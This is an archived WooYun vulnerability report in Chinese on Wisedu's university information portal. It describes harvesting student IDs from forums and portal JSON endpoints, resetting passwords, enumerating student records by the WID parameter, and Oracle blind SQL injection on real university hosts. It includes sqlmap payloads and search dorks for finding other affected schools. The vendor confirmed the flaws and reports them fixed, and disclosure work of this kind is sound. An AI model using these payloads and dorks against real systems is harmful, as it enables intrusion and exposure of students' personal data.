{"id": 41921, "wybug_id": "wooyun-2014-087297", "wybug_title": "金智教育信息门户系统可遍历用户信息并存在SQL注入漏洞", "wybug_corp": "wisedu.com", "wybug_author": "浮萍", "wybug_date": "2014-12-16 16:36", "wybug_open_date": "2015-03-16 16:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向公众公开  简要描述： 遍历+SQL注入 详细说明：   WooYun: 金智教育信息门户设计问题可导致重置任意用户密码（自相矛盾的设计） 参考该漏洞，当知道该用户的学号时，就能获取其密码然后登陆这里我们以“河南农业大学”为例进入该校贴吧然后搜索关键字“学号”\n\n然后找一个学号（注意：有的学号虽然存在，但是未曾登陆信息门户，所以不用该类账号可以通过http://my.henau.edu.cn/userAttributesView.portal?userId=XX来判断该账号是否合法）这里搜到一个12XXXX79 然后通过  WooYun: 金智教育信息门户设计问题可导致重置任意用户密码（自相矛盾的设计）  来设置密码\n\n设置密码后登陆学工系统http://xg.henau.edu.cn/epstar/login/index.jsp\n\n有的学号登陆后会显示如下错误\n\n这是由于毕业或其他原因，该账号会禁止访问某些页面但我们不用管，我们要的是cookie访问http://xg.henau.edu.cn/epstar/web/apps/reportJsp/showReport.jsp?raq=SWMS/JBXXXQ.raq&WID=XXXX  （WID为学号）\n\n可以遍历别人的信息学号的获取可以通过信息门户中获得例如登陆http://my.henau.edu.cn/index.portal\n\n依次选择：站内消息-》写消息-》用户名—》人员然后通过抓包得到该链接http://my.henau.edu.cn/authorizeUsers.portal?limit=20是个json\n\n另外http://xg.henau.edu.cn/epstar/web/apps/reportJsp/showReport.jsp?raq=SWMS/JBXXXQ.raq&WID=XXX  也是一个注入点\n\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: WID (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: raq=SWMS/JBXXXQ.raq&WID=100XXXX36 AND 5846=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(70)||CHR(66)||CHR(86),5)---back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):    'USR_XG'\n   漏洞证明：  再以http://my.zzuli.edu.cn/index.portal为例访问http://my.zzuli.edu.cn//authorizeUsers.portal?limit=20可以获取json数据或者http://my.zzuli.edu.cn/pnull.portal?.f=f1144&.pmn=view&action=fetchUsers&.ia=false&.pen=personnelGroupmanager&groupId=2010_PG.XXXXXXXXX.root&limit=10&oper_type=normal_user&start=0同样是一个json数据都包含学号和姓名等信息\n\n\n\n然后访问http://xg.zzuli.edu.cn/epstar/web/apps/reportJsp/showReport.jsp?raq=SWMS/JBXXXQ.raq&WID=XXXXXx\n\n同样可以遍历然后SQL注入\nsqlmap identified the following injection points with a total of 248 HTTP(s) requests:---Place: GETParameter: WID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: raq=SWMS/JBXXXQ.raq&WID=54****08 AND 9297=9297    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: raq=SWMS/JBXXXQ.raq&WID=5 AND 8235=DBMS_PIPE.RECEIVE_MESSAGE(CHR(67)||CHR(114)||CHR(70)||CHR(67),5)---\n\nweb application technology: JSPback-end DBMS: Oracle\n\ncurrent schema (equivalent to database on Oracle):    'USR_XG'\n由于SQL注入和遍历需要登陆这里就不再举例了给出几个同样存在问题的学校测试方法如上搜索关键字：inurl:/epstar/web/swms/mainframe/homeWithGroupSelector.jsp\n\n或者inurl:/epstar/login/index.jsp\n\n也可以将my.XXX.edu.cn换成xg.xxx.edu.cn来访问当使用my.xxx.edu.cn登陆后访问http://xg.xxx.edu.cn/epstar/web/apps/reportJsp/showReport.jsp?raq=SWMS/JBXXXQ.raq&WID=XXXX\n\nmask 区域\n1.http://**.**.**/epstar/web/swms/mainframe/homeWithGroupSelector.jsp_2.http://**.**.**/epstar/web/swms/mainframe/homeWithGroupSelector.jsp_3.http://**.**.**/epstar/web/swms/mainframe/homeWithGroupSelector.jsptbarstyle=2_4.http://**.**.**/epstar/login/index.jsp_5.http://**.**.**/epstar/login/index.jsp_6.http://**.**.**/epstar/login/index.jsp_7.http://**.**.**/epstar/login/index.jsp_8.http://**.**.**/_9.http://**.**.**/_10.http://**.**.**/_11.http://**.**.**/xg/_12.http://**.**.**/epstar/login/index.jsp_13.http://**.**.**/_14.http://**.**.**/_15.http://**.**.**/epstar/web/swms/mainframe/homeWithGroupSelector.jsp_16.http://**.**.**/_17.http://**.**.**/login.portal_18.http://**.**.**/_19.http://**.**.**/_*****u.ed*****20.http://**.**.**/_21.http://**.**.**/epstar/login/index.jsp_22.http://**.**.**/\n\n   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-19 16:31 厂商回复： 任意用户密码（自相矛盾的设计）-该漏洞前段时间已发现，漏洞补丁包已出，目前已有部分学校更新了此漏洞补丁包。SQL漏洞-该漏洞修复方案已出，目前已有部分学校更新了此漏洞补丁包。 最新状态： 2015-08-12：此漏洞已修复，非常感谢  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}